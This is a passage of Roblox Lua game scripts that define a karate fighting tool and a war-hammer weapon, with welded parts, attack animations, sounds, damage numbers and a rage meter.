a.position = torso.Position
 
local b = Add.BG(torso)
 
b.cframe = CFrame.new(torso.Position, torso.CFrame * CFrame.new(0, 0, -5).p)
 
wait(0.6)
 
a:remove()
 
b:remove()
 
able = true
 
end
 
end
 
LastHP = hum.Health
 
end
 
hum.HealthChanged:connect(HpChange)
 
hc = Instance.new("Humanoid")
 
hc.Health = 0
 
hc.MaxHealth = 0
 
slash = Instance.new("Sound")
 
slash.SoundId = "rbxasset://sounds//swordslash.wav"
 
slash.Volume = 0.8
 
slash.Pitch = 1.4
 
slash.Parent = Rarm
 
hitsound = Instance.new("Sound")
 
hitsound.SoundId = "http://www.roblox.com/asset/?id=2801263"
 
hitsound.Volume = 0.55
 
hitsound.Pitch = 2.1
 
hitsound.Parent = torso
 
Mo = Instance.new("Model")
 
Mo.Name = Modelname
 
RABrick = Part(Mo, false, false, 1, 0, "Black", 0.1, 0.1, 0.1, true)
 
LABrick = Part(Mo, false, false, 1, 0, "Black", 0.1, 0.1, 0.1, true)
 
RLBrick = Part(Mo, false, false, 1, 0, "Black", 0.1, 0.1, 0.1, true)
 
LLBrick = Part(Mo, false, false, 1, 0, "Black", 0.1, 0.1, 0.1, true)
 
RABW = Weld(torso, RABrick, -1.5, -0.5, 0, 0, 0, 0)
 
LABW = Weld(torso, LABrick, 1.5, -0.5, 0, 0, 0, 0)
 
RLBW = Weld(torso, RLBrick, -0.5, 1.2, 0, 0, 0, 0)
 
LLBW = Weld(torso, LLBrick, 0.5, 1.2, 0, 0, 0, 0)
 
RAW = Weld(RABrick, nil, 0, 0.5, 0, 0, 0, 0)
 
LAW = Weld(LABrick, nil, 0, 0.5, 0, 0, 0, 0)
 
RLW = Weld(RLBrick, nil, 0, 0.8, 0, 0, 0, 0)
 
LLW = Weld(LLBrick, nil, 0, 0.8, 0, 0, 0, 0)
 
TBricks = {}
 
for i, v in pairs({Rarm, Larm, Rleg, Lleg}) do
 
local p = Part(Mo, false, false, 1, 0, "Black", 0.9, 0.9, 0.8, true)
 
Weld(v, p, 0, 0.7, 0, 0, 0, 0)
 
table.insert(TBricks, {p, hurt = false, able = true})
 
end
 
function startEff(part)
 
effectOn = true
 
local lastPoint = part.Position
 
coroutine.resume(coroutine.create(function()
 
while effectOn do
 
wait()
 
local mag = (lastPoint - part.Position).magnitude
 
local p = Part(Mo, true, false, 0.5, 0.05, "Really black", 0.1, 0.1, mag+0.2, true)
 
p.CFrame = CFrame.new(lastPoint, part.Position) * CFrame.new(0, 0, -mag/2)
 
Instance.new("BlockMesh",p)
 
lastPoint = part.Position
 
coroutine.resume(coroutine.create(function()
 
for x=0.2,1,0.2 do
 
wait()
 
p.Transparency = x
 
end
 
p:remove()
 
end))
 
end
 
end))
 
end
 
function endEff()
 
effectOn = false
 
end
 
function ShowDMG(p, d)
 
local mo = Instance.new("Model")
 
mo.Name = d
 
local pa = Part(mo, false, true, 0.5, 0, "Really red", 0.8, 0.2, 0.8, true)
 
pa.CFrame = CFrame.new(p.Position)
 
pa.Name = "Head"
 
local hah = hc:clone()
 
hah.Parent = mo
 
local bp = Add.BP(pa)
 
bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
 
bp.position = p.Position + Vector3.new(0, 2.5, 0)
 
Add.BG(pa)
 
coroutine.resume(coroutine.create(function()
 
wait(0.2)
 
mo.Parent = workspace
 
wait(1.5)
 
mo:remove()
 
end))
 
end
 
for i, v in pairs(TBricks) do
 
v[1].Touched:connect(function(hit)
 
local fig = hit.Parent
 
H, T = getHumanoid(fig), fig:findFirstChild("Torso")
 
if H ~= nil and T ~= nil and v.hurt and v.able then
 
hitsound:play()
 
v.able = false
 
local d = math.random(dmg[1], dmg[2])
 
local hed, ne = getHead(fig, v[1].Position, 2.5)
 
if dmg[3] == "RoundHouse" and hed ~= nil then
 
d = math.random(dmg[1]*2.4, dmg[2]*2.4)
 
coroutine.resume(coroutine.create(function()
 
if ne ~= nil then
 
for i=0,60,20 do
 
ne.C0 = necko * CFrame.Angles(math.rad(-i), 0, 0)
 
wait()
 
end
 
for i=60,0,-20 do
 
ne.C0 = necko * CFrame.Angles(math.rad(-i), 0, 0)
 
wait()
 
end
 
ne.C0 = necko
 
end
 
end))
 
end
 
H.Health = H.Health - d
 
local xd = CFrame.new(v[1].Position, hit.Position)
 
hit.Velocity = xd.lookVector * (d*2.3)
 
ShowDMG(v[1], d)
 
wait(0.34)
 
v.able = true
 
end
 
end)
 
end
 
Mo.Parent = char
 
RAWBattle = nil
 
LAWBattle = nil
 
function nilparts()
 
LAW.Part1 = nil
 
RAW.Part1 = nil
 
RLW.Part1 = nil
 
LLW.Part1 = nil
 
LAW.C0 = CFrame.new(0, 0, 0)
 
RLW.C0 = CFrame.new(0, 0, 0)
 
LLW.C0 = CFrame.new(0, 0, 0)
 
RAW.C0 = CFrame.new(0, 0, 0)
 
end
 
function attach()
 
LAW.Part1 = Larm
 
RLW.Part1 = Rleg
 
LLW.Part1 = Lleg
 
RAW.Part1 = Rarm
 
LAW.C0 = CFrame.new(0, 0, 0)
 
RLW.C0 = CFrame.new(0, 0, 0)
 
LLW.C0 = CFrame.new(0, 0, 0)
 
RAW.C0 = CFrame.new(0, 0, 0)
 
end
 
attacks = {
 
function(mouse)
 
local Orig = torso.CFrame
 
local MousePos = mouse.Hit.p
 
local bg = Add.BG(torso)
 
local bp = Add.BP(torso)
 
bp.position = Orig.p
 
local CF = ComputePos(Orig.p, MousePos)
 
local CF2 = CF
 
bg.cframe = CF2
 
attach()
 
bp.position = CF * CFrame.new(0, 0, -1.5).p
 
startEff(TBricks[3][1])
 
TBricks[3].hurt = true
 
slash:play()
 
dmg = dmgs.Kdmg
 
for i = 0, 100, 100/4 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad(i)) * CFrame.new(0, -i/200, 0)
 
LLW.C0 = CFrame.Angles(0, 0, math.rad(-i/4))
 
RAW.C0 = CFrame.Angles(math.rad(i/8), 0, math.rad(-i/7))
 
LAW.C0 = CFrame.Angles(math.rad(i/6), 0, math.rad(-i/7))
 
CF2 = CF * CFrame.Angles(math.rad(i/4), math.rad(i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
wait(0.1)
 
TBricks[3].hurt = false
 
for i = 100, 0, -100/5 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad(i)) * CFrame.new(0, -i/150, 0)
 
LLW.C0 = CFrame.Angles(0, 0, math.rad(-i/4))
 
RAW.C0 = CFrame.Angles(math.rad(i/8), 0, math.rad(-i/7))
 
LAW.C0 = CFrame.Angles(math.rad(i/8), 0, math.rad(-i/7))
 
CF2 = CF * CFrame.Angles(math.rad(i/4), math.rad(i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
endEff()
 
wait()
 
nilparts()
 
bg:remove()
 
bp:remove()
 
neck.C0 = necko
 
end,
 
function(mouse)
 
local Orig = torso.CFrame
 
local MousePos = mouse.Hit.p
 
local bg = Add.BG(torso)
 
local bp = Add.BP(torso)
 
bp.position = Orig.p
 
local CF = ComputePos(Orig.p, MousePos)
 
local CF2 = CF
 
bg.cframe = CF2
 
attach()
 
bp.position = CF * CFrame.new(0, 0, -1.5).p
 
TBricks[2].hurt = true
 
startEff(TBricks[2][1])
 
slash:play()
 
dmg = dmgs.Pdmg
 
for i = 0, -90, -90/4 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad(-i/4))
 
LLW.C0 = CFrame.Angles(0, 0, math.rad(i/4))
 
RAW.C0 = CFrame.Angles(0, 0, 0)
 
LAW.C0 = CFrame.Angles(math.rad(-i), 0, math.rad(i))
 
CF2 = CF * CFrame.Angles(math.rad(i/8), math.rad(i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
wait(0.07)
 
TBricks[2].hurt = false
 
endEff()
 
startEff(TBricks[1][1])
 
TBricks[1].hurt = true
 
bp.position = CF * CFrame.new(0, 0, -3).p
 
slash:play()
 
for i = -90, 0, 90/7 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-(i*2+90)))
 
RAW.C0 = CFrame.Angles(math.rad(i-90), math.pi, math.rad(i-90))
 
LAW.C0 = CFrame.Angles(math.rad(-i), 0, math.rad(i))
 
CF2 = CF * CFrame.Angles(math.rad(i/8), math.rad(i*2+90), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
wait(0.07)
 
TBricks[1].hurt = false
 
for i = 0, -90, -90/5 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-(i+90)))
 
RAW.C0 = CFrame.Angles(math.rad(i-90), math.pi, math.rad(i-90))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad(i/4+23))
 
LLW.C0 = CFrame.Angles(0, 0, math.rad(-i/4-23))
 
CF2 = CF * CFrame.Angles(0, math.rad(i+90), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
endEff()
 
wait()
 
nilparts()
 
bg:remove()
 
bp:remove()
 
neck.C0 = necko
 
end,
 
function(mouse)
 
local Orig = torso.CFrame
 
local MousePos = mouse.Hit.p
 
local bg = Add.BG(torso)
 
local bp = Add.BP(torso)
 
bp.position = Orig.p
 
local CF = ComputePos(Orig.p, MousePos)
 
local CF2 = CF
 
bg.cframe = CF2
 
attach()
 
bp.position = CF * CFrame.new(0, 0, -1.5).p
 
TBricks[4].hurt = true
 
startEff(TBricks[4][1])
 
slash:play()
 
dmg = dmgs.K2dmg
 
for i = 0, -100, -100/4 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad(-i/4))
 
LLW.C0 = CFrame.Angles(0, 0, math.rad(i))
 
RAW.C0 = CFrame.Angles(math.rad(-i/6), 0, math.rad(-i/7))
 
LAW.C0 = CFrame.Angles(math.rad(i/6), 0, math.rad(-i/7))
 
CF2 = CF * CFrame.Angles(math.rad(-i/5), math.rad(i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
wait(0.1)
 
bp.position = CF * CFrame.new(0, 0, -3).p
 
TBricks[4].hurt = false
 
endEff()
 
startEff(TBricks[3][1])
 
TBricks[3].hurt = true
 
local lol1, lol2 = RLW.C0, LLW.C0
 
slash:play()
 
for i = -100, -290, -190/5 do
 
RLW.C0 = lol1 * CFrame.Angles(0, 0, math.rad(-i/3-(100/4)))
 
LLW.C0 = CFrame.Angles(0, 0, math.rad((-i/3)-100))
 
CF2 = CF * CFrame.Angles(math.rad(100/5), math.rad(i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
wait(0.1)
 
bp.position = CF * CFrame.new(0, 0, -4.5).p
 
TBricks[3].hurt = false
 
lol1, lol2 = RLW.C0, LLW.C0
 
for i = 0, -70, -70/3 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad((i*1.3)+100))
 
RLW.C0 = lol1 * CFrame.Angles(0, 0, math.rad(i*1.4))
 
LLW.C0 = lol2 * CFrame.Angles(0, 0, 0)
 
RAW.C0 = CFrame.Angles(0, 0, 0)
 
LAW.C0 = CFrame.Angles(0, 0, 0)
 
CF2 = CF * CFrame.Angles(0, math.rad(-290+i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
endEff()
 
wait()
 
nilparts()
 
bg:remove()
 
bp:remove()
 
neck.C0 = necko
 
end,
 
function(mouse)
 
if mouse ~= nil then
 
local Orig = torso.CFrame
 
local MousePos = mouse.Hit.p
 
local bg = Add.BG(torso)
 
local bp = Add.BP(torso)
 
bp.position = Orig.p
 
local CF = ComputePos(Orig.p, MousePos)
 
local CF2 = CF
 
bg.cframe = CF2
 
startEff(TBricks[3][1])
 
attach()
 
bp.position = CF * CFrame.new(0, 0, -1).p
 
dmg = dmgs.Rdmg
 
for i = 0, 180, 180/7 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(i/2))
 
RLW.C0 = CFrame.Angles(0, 0, 0)
 
LLW.C0 = CFrame.Angles(0, 0, 0)
 
RAW.C0 = CFrame.Angles(math.rad(i/5), 0, math.rad(i/10))
 
LAW.C0 = CFrame.Angles(math.rad(-i/5), 0, math.rad(-i/10))
 
CF2 = CF * CFrame.Angles(math.rad(i/5.8), math.rad(-i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
slash:play()
 
TBricks[3].hurt = true
 
for i = 180, 180+90, 90/4 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad((-i*2-180)-90))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad((i*1.45)-(180*1.45))) * CFrame.new(0, (-i+180)/100, 0)
 
LLW.C0 = CFrame.Angles(0, 0, math.rad((-i/3)+(180/3)))
 
RAW.C0 = CFrame.Angles(math.rad(i/5), 0, math.rad(i/10))
 
LAW.C0 = CFrame.Angles(math.rad(-i/5), 0, math.rad(-i/10))
 
CF2 = CF * CFrame.Angles(math.rad(180/5.8), math.rad(-i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
TBricks[3].hurt = false
 
wait()
 
for i = 270, 360, 90/5 do
 
local a = i-270
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(i))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad((-a*1.1)-(180*1.45))) * CFrame.new(0, (a/100)+((-270+180)/100), 0)
 
LLW.C0 = CFrame.Angles(0, 0, math.rad((a/3)-(90/3)))
 
RAW.C0 = CFrame.Angles(math.rad(270/5-((a*3)/5)), 0, math.rad(270/10-((a*3)/10)))
 
LAW.C0 = CFrame.Angles(math.rad(-270/5+((a*3)/5)), 0, math.rad(-270/10+((a*3)/10)))
 
CF2 = CF * CFrame.Angles(math.rad((180/5.8)-((a*2)/5.8)), math.rad(-i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
endEff()
 
wait()
 
nilparts()
 
bg:remove()
 
bp:remove()
 
neck.C0 = necko
 
end
 
end,
 
function(mouse)
 
local Orig = torso.CFrame
 
local MousePos = mouse.Hit.p
 
local bg = Add.BG(torso)
 
local bp = Add.BP(torso)
 
bp.position = Orig.p
 
local CF = ComputePos(Orig.p, MousePos)
 
local CF2 = CF
 
bg.cframe = CF2
 
startEff(TBricks[2][1])
 
attach()
 
bp.position = CF * CFrame.new(0, 0, -0.8).p
 
dmg = dmgs.Kardmg
 
for i = 0, -45, -45/3 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad(-i/4))
 
LLW.C0 = CFrame.Angles(0, 0, math.rad(i/4))
 
RAW.C0 = CFrame.Angles(0, 0, math.rad(-i/3))
 
LAW.C0 = CFrame.Angles(math.rad(-i*4), 0, 0)
 
CF2 = CF * CFrame.Angles(0, math.rad(i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
TBricks[2].hurt = true
 
bp.position = CF * CFrame.new(0, 0, -1.6).p
 
slash:play()
 
for i = -45, -110, -65/3 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i))
 
LAW.C0 = CFrame.Angles(math.rad(-45*4), 0, math.rad((i*2+110)))
 
CF2 = CF * CFrame.Angles(0, math.rad(i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
wait()
 
TBricks[2].hurt = false
 
for i = -110, 0, 110/4 do
 
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i))
 
LAW.C0 = CFrame.Angles(0, 0, math.rad(i) )
 
RAW.C0 = CFrame.Angles(0, 0, math.rad(-i/2/3))
 
RLW.C0 = CFrame.Angles(0, 0, math.rad(45/4-(((i/2)+45)/4)))
 
LLW.C0 = CFrame.Angles(0, 0, math.rad(45/4+(((i/2)-45)/4)))
 
CF2 = CF * CFrame.Angles(0, math.rad(i), 0)
 
bg.cframe = CF2
 
wait()
 
end
 
endEff()
 
wait()
 
nilparts()
 
bg:remove()
 
bp:remove()
 
neck.C0 = necko
 
end
 
}
 
bloc = function(mouse)
 
local hold = true
 
local bg = Add.BG(nil)
 
attach()
 
RLW.Part1 = nil
 
LLW.Part1 = nil
 
slash:play()
 
local duh = true
 
block = true
 
mouse.KeyUp:connect(function(k)
 
k = k:lower()
 
if duh == true and k == "t" then
 
block = false
 
duh = false
 
hold = false
 
end
 
end)
 
coroutine.resume(coroutine.create(function()
 
for i = 0, 90, 90/7 do
 
RAW.C0 = CFrame.new(-i/150, 0, -i/170) * CFrame.Angles(math.rad(i/1.1), 0, math.rad(-i/1.2))
 
LAW.C0 = CFrame.new(i/150, 0, -i/170) * CFrame.Angles(math.rad(i*1.25), 0, math.rad(i/1.5))
 
wait()
 
end
 
end))
 
bg.Parent = torso
 
while block and hold do
 
wait()
 
bg.cframe = ComputePos(torso.Position, mouse.Hit.p)
 
end
 
for i = 90, 0, -90/7 do
 
RAW.C0 = CFrame.new(-i/150, 0, -i/170) * CFrame.Angles(math.rad(i/1.1), 0, math.rad(-i/1.2))
 
LAW.C0 = CFrame.new(i/150, 0, -i/170) * CFrame.Angles(math.rad(i*1.25), 0, math.rad(i/1.5))
 
wait()
 
end
 
nilparts()
 
bg:remove()
 
neck.C0 = necko
 
end
 
function select(mouse)
 
mouse.Button1Down:connect(function()
 
if able then
 
able = false
 
attacks[1](mouse)
 
attacks[2](mouse)
 
attacks[3](mouse)
 
attacks[4](mouse)
 
attacks[5](mouse)
 
able = true
 
end
 
end)
 
mouse.KeyDown:connect(function(key)
 
key = key:lower()
 
if able then
 
if key == "q" then
 
able = false
 
attacks[2](mouse)
 
able = true
 
elseif key == "e" then
 
able = false
 
attacks[1](mouse)
 
able = true
 
elseif key == "r" then
 
able = false
 
attacks[3](mouse)
 
able = true
 
elseif key == "f" then
 
able = false
 
attacks[4](mouse)
 
able = true
 
elseif key == "g" then
 
able = false
 
attacks[5](mouse)
 
able = true
 
elseif key == "t" then
 
able = false
 
bloc(mouse)
 
able = true
 
elseif key == "z" then
 
able = false
 
holdkey = true
 
while holdkey do
 
attacks[math.random(1,#attacks)](mouse)
 
end
 
able = true
 
end
 
end
 
end)
 
mouse.KeyUp:connect(function(key)
 
key = key:lower()
 
if key == "z" then
 
holdkey = false
 
end
 
end)
 
end
 
if script.Parent.className ~= "HopperBin" then
 
h = Instance.new("HopperBin",me.Backpack)
 
h.Name = "Soul Crushing Karate"
 
script.Parent = h
 
end
 
bin = script.Parent
 
bin.Selected:connect(select)
 
end) if not a then Instance.new("Hint",workspace).Text = b end
]]
 
 
WarHammer = [[
Ancor = game:GetService("Players")
me = Ancor.LocalPlayer
char = me.Character
Modelname = "Warhammah"
Toolname = "Warhammar"
Surfaces = {"FrontSurface", "BackSurface", "TopSurface", "BottomSurface", "LeftSurface", "RightSurface"}
necko = CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
selected = false
effectOn = false
Hurt = false
Leghurt = false
Deb = true
LegDeb = true
Able = true
Resting = false
RestingAnim = false
AbleG = true
Prop = {Damage = 62, Legdmg = 50, AS = 90, ShockDMG = 50, Rage = 1000000, RageIncome = 1, MaxRage = 1000000}
Prop.AS = Prop.AS/300
Cam = workspace.CurrentCamera
ToolIcon = "http://www.roblox.com/asset/?id=49192762"
MouseIc = "http://www.roblox.com/asset/?id=49192792"
MouseDo = "http://www.roblox.com/asset/?id=49192819"
Add = {
        Sphere = function(P)
                local m = Instance.new("SpecialMesh",P)
                m.MeshType = "Sphere"
                return m
        end,
        BF = function(P)
                local bf = Instance.new("BodyForce",P)
                bf.force = Vector3.new(0, P:GetMass()*187, 0)
                return bf
        end,
        BP = function(P)
                local bp = Instance.new("BodyPosition",P)
                bp.maxForce = Vector3.new(math.huge, 0, math.huge)
                bp.P = 14000
                return bp
        end,
        BG = function(P)
                local bg = Instance.new("BodyGyro",P)
                bg.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                bg.P = 14000
                return bg
        end,
        Mesh = function(P, ID, x, y, z)
                local m = Instance.new("SpecialMesh")
                m.MeshId = ID
                m.Scale = Vector3.new(x, y, z)
                m.Parent = P
                return m
        end,
        Sound = function(P, ID, vol, pitch)
                local s = Instance.new("Sound")
                s.SoundId = ID
                s.Volume = vol
                s.Pitch = pitch
                s.Parent = P
                return s
        end
}
 
function find(tab, arg)
        local ah = nil
        for i,v in pairs(tab) do
                if v == arg then
                        ah = v
                end
        end
        return ah
end
 
function getAllParts(from)
        local t = {}
        function getParts(where)
                for i, v in pairs(where:children()) do
                        if v:IsA("BasePart") then
                                if v.Parent ~= char and v.Parent.Parent ~= char then
                                        table.insert(t, v)
                                end
                        end
                        getParts(v)
                end
        end
        getParts(workspace)
        return t
end
 
function RayCast(pos1, pos2, maxDist, forward)
        local list = getAllParts(workspace)
        local pos0 = pos1
        for dist = 1, maxDist, forward do
                pos0 = (CFrame.new(pos1, pos2) * CFrame.new(0, 0, -dist)).p
                for _, v in pairs(list) do
                        local pos3 = v.CFrame:pointToObjectSpace(pos0)
                        local s = v.Size
                        if pos3.x > -(s.x/2) and pos3.x < (s.x/2) and pos3.y > -(s.y/2) and pos3.y < (s.y/2) and pos3.z > -(s.z/2) and pos3.x < (s.z/2) and v.CanCollide and v:GetMass() > 14 then
                                return pos0, v
                        end
                end
        end
        return pos0, nil
end
 
function Part(Parent, Anchor, Collide, Tran, Ref, Color, X, Y, Z, Break)
        local p = Instance.new("Part")
        p.formFactor = "Custom"
        p.Anchored = Anchor
        p.CanCollide = Collide
        p.Transparency = Tran
        p.Reflectance = Ref
        p.BrickColor = BrickColor.new(Color)
        for _, Surf in pairs(Surfaces) do
                p[Surf] = "Smooth"
        end
        p.Size = Vector3.new(X, Y, Z)
        if Break then
                p:BreakJoints()
        else p:MakeJoints() end
        p.Parent = Parent
        p.Locked = true
        return p
end
 
function Weld(p0, p1, x, y, z, a, b, c)
        local w = Instance.new("Weld")
        w.Parent = p0
        w.Part0 = p0
        w.Part1 = p1
        w.C1 = CFrame.new(x,y,z) * CFrame.Angles(a,b,c)
        return w
end
 
function ComputePos(pos1, pos2)
        local pos3 = Vector3.new(pos2.x, pos1.y, pos2.z)
        return CFrame.new(pos1, pos3)
end
 
function getHumanoid(c)
        local h = nil
        for i,v in pairs(c:children()) do
                if v:IsA("Humanoid") and c ~= char then
                        if v.Health > 0 then
                                h = v
                        end
                end
        end
        return h
end
 
for i,v in pairs(char:children()) do
        if v.Name == Modelname then
                v:remove()
        end
end
 
pcall(function() me.PlayerGui:findFirstChild("RaigMeter",true):remove() end)
 
Sc = Instance.new("ScreenGui",me:findFirstChild("PlayerGui"))
Sc.Name = "RaigMeter"
 
Fr = Instance.new("Frame",Sc)
Fr.Size = UDim2.new(0, 250, 0, 28)
Fr.Position = UDim2.new(0.5, -125, 0, 5)
Fr.BackgroundColor3 = Color3.new(0.8, 0.3, 0.1)
 
Met = Instance.new("Frame", Fr)
Met.Size = UDim2.new(1, -10, 1, -6)
Met.Position = UDim2.new(0, 5, 0, 3)
Met.BackgroundColor3 = Color3.new(0, 0, 0)
Met.BorderSizePixel = 0
 
Meter = Instance.new("ImageLabel", Met)
Meter.Size = UDim2.new(Prop.Rage/Prop.MaxRage, 0, 1, -2)
Meter.Position = UDim2.new(0, 0, 0, 1)
Meter.Image = "http://www.roblox.com/asset/?id=48965808"
Meter.BorderSizePixel = 0
Meter.BackgroundColor3 = Color3.new(1, 0.6, 0.1)
 
Tx = Instance.new("TextLabel", Met)
Tx.Size = UDim2.new(0, 0, 1, 0)
Tx.Position = UDim2.new(0, 5, 0, 0)
Tx.Text = Prop.Rage.." / "..Prop.MaxRage
Tx.Font = "ArialBold"
Tx.FontSize = "Size18"
Tx.BackgroundTransparency = 1
Tx.TextColor3 = Color3.new(1, 0, 0)
Tx.TextXAlignment = "Left"
 
laast = Prop.Rage
coroutine.resume(coroutine.create(function()
        while true do
                wait()
                if Prop.Rage > Prop.MaxRage then Prop.Rage = Prop.MaxRage end
                if laast ~= Prop.Rage then
                        Meter.Size = UDim2.new(Prop.Rage/Prop.MaxRage, 0, 1, -2)
                        laast = Prop.Rage
                        Tx.Text = Prop.Rage.." / "..Prop.MaxRage
                end
        end
end))
 
torso = char.Torso
neck = torso.Neck
hum = char.Humanoid
Rarm = char["Right Arm"]
Larm = char["Left Arm"]
Rleg = char["Right Leg"]
Lleg = char["Left Leg"]
 
hc = Instance.new("Humanoid")
hc.Health = 0
hc.MaxHealth = 0
 
slash = Add.Sound(nil, "rbxasset://sounds//swordslash.wav", 0.9, 0.8)
hitsound = Add.Sound(nil, "http://www.roblox.com/asset/?id=2801263", 0.7, 0.6)
charge = Add.Sound(nil, "http://www.roblox.com/asset/?id=2101137", 0.8, 0.65)
boom = Add.Sound(nil, "http://www.roblox.com/asset/?id=2691586", 0.8, 0.3)
smashsound = Add.Sound(nil, "http://www.roblox.com/asset/?id=2692806", 0.8, 0.35)
boomboom = Add.Sound(nil, "http://www.roblox.com/asset/?id=2760979", 1, 0.18)
equip = Add.Sound(nil, "rbxasset://sounds\\unsheath.wav", 0.6, 0.7)
 
function PlaySound(sound, pitch)
        local s = sound:clone()
        if pitch ~= nil then
                if tonumber(pitch) then
                        s.Pitch = tonumber(pitch)
                end
        end
        s.Parent = torso
        s.PlayOnRemove = true
        coroutine.resume(coroutine.create(function()
                wait()
                s:remove()
        end))
end
 
Mo = Instance.new("Model")
Mo.Name = Modelname
 
RABrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
LABrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
RLBrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
LLBrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
 
RABW = Weld(torso, RABrick, -1.5, -0.5, 0, 0, 0, 0)
LABW = Weld(torso, LABrick, 1.5, -0.5, 0, 0, 0, 0)
RLBW = Weld(torso, RLBrick, -0.5, 1.2, 0, 0, 0, 0)
LLBW = Weld(torso, LLBrick, 0.5, 1.2, 0, 0, 0, 0)
 
RAW = Weld(RABrick, nil, 0, 0.5, 0, 0, 0, 0)
LAW = Weld(LABrick, nil, 0, 0.5, 0, 0, 0, 0)
RLW = Weld(RLBrick, nil, 0, 0.8, 0, 0, 0, 0)
LLW = Weld(LLBrick, nil, 0, 0.8, 0, 0, 0, 0)
 
HB = Part(Mo, false, false, 1, 0, "Really black", 0.1, 0.1, 0.1, true)
HBW = Weld(Rarm, HB, 0, 1, 0, 0, 0, 0)
HW = Weld(HB, nil, 0, -1.3, 0, math.pi/2, 0, 0)
 
TH = Weld(torso, nil, -0.8, 0.1, 0, 0, math.pi/2, math.rad(-140))
 
RAWStand, LAWStand, RLWStand, LLWStand, HWStand = nil
 
handle = Part(Mo, false, false, 0, 0, "White", 0.4, 5, 0.4, true)
handle.Name = "Handle"
Instance.new("SpecialMesh",handle)
 
maintip = Part(Mo, false, false, 1, 0, "Bright yellow", 0.6, 0.5, 0.6, true)
Weld(handle, maintip, 0, -1.8, 0, 0, 0, 0)
 
DMGParts = {}
 
for i = 0, 135, 45 do
        local tip = Part(Mo, false, false, 0, 0, "Really black", 0.54, 1.3, 2.2, true)
        Instance.new("BlockMesh",tip)
        Weld(maintip, tip, 0, 0, 0, 0, 0, math.rad(i))
        table.insert(DMGParts, tip)
        for a = -0.9, 0.9, 1.8 do
                for x = 0, math.pi, math.pi do
                        local spike = Part(Mo, false, false, 0, 0, "Really black", 0.3, 0.5, 0.3, true)
                        local w = Weld(tip, spike, 0, 0, 0, 0, 0, 0)
                        w.C0 = CFrame.new(0, 0, a) * CFrame.Angles(x, 0, 0)
                        w.C1 = CFrame.new(0, -1, 0)
                        Add.Mesh(spike, "http://www.roblox.com/asset/?id=1033714", 0.14, 1, 0.14)
                        local trim = Part(Mo, false, false, 0, 0, "White", 0.67, 0.1, 0.5, true)
                        local w2 = Weld(tip, trim, 0, 0, 0, 0, 0, 0)
                        w2.C0 = CFrame.new(0, 0, a) * CFrame.Angles(x, 0, 0)
                        w2.C1 = CFrame.new(0, -0.58, 0)
                end
        end
end
 
spiketip = Part(Mo, false, false, 0, 0.2, "Really black", 0.3, 0.8, 0.3, true)
Weld(handle, spiketip, 0, -3.1, 0, 0, 0, 0)
Add.Mesh(spiketip, "http://www.roblox.com/asset/?id=1033714", 0.17, 2, 0.17)
 
table.insert(DMGParts, spiketip)
 
local handletip1 = Part(Mo, false, false, 0, 0.2, "White", 0.5, 0.5, 0.5, true)
local w1 = Weld(handle, handletip1, 0, 0, 0, 0, 0, 0)
w1.C0 = CFrame.new(0, -2.6, 0)
Add.Mesh(handletip1, "http://www.roblox.com/asset/?id=9756362", 0.85, 0.75, 0.85)
 
local handletip2 = Part(Mo, false, false, 0, 0.2, "Really black", 0.5, 0.5, 0.5, true)
Weld(handletip1, handletip2, 0, 0, 0, 0, math.rad(45), 0)
Add.Mesh(handletip2, "http://www.roblox.com/asset/?id=9756362", 0.95, 0.5, 0.95)
 
 
Mo.Parent = char
TH.Part1 = handle
 
function showdmg(dmg, p, pos)
        local mo = Instance.new("Model")
        mo.Name = dmg
        local pa = Part(mo, false, true, 0, 0, "Bright red", 0.8, 0.3, 0.8, true)
        pa.CFrame = CFrame.new(p.Position) * CFrame.new(0, pos, 0)
        pa.Name = "Head"
        local hah = hc:clone()
        hah.Parent = mo
        local bp = Add.BP(pa)
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.position = p.Position + Vector3.new(0, 3+pos, 0)
        Add.BG(pa)
        coroutine.resume(coroutine.create(function()
                wait()
                mo.Parent = workspace
                wait(1.4)
                mo:remove()
        end))
end
 
 
function damage(hum, p, num, dm1, dm2)
        local dmg = math.random(dm1, dm2)
        hum.Health = hum.Health - dmg
        showdmg(dmg, p, num)
